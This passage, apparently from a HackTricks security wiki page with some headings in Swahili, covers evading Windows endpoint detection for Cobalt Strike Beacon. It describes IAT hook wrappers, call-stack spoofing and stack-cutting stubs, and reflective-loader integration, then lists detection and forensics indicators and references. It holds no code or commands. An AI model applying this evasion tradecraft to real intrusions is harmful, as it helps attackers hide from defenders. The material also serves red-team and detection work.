- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Uingiliano wa Uendeshaji
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Vitu vinavyohusiana na mifumo na mifano
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Marejeo

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
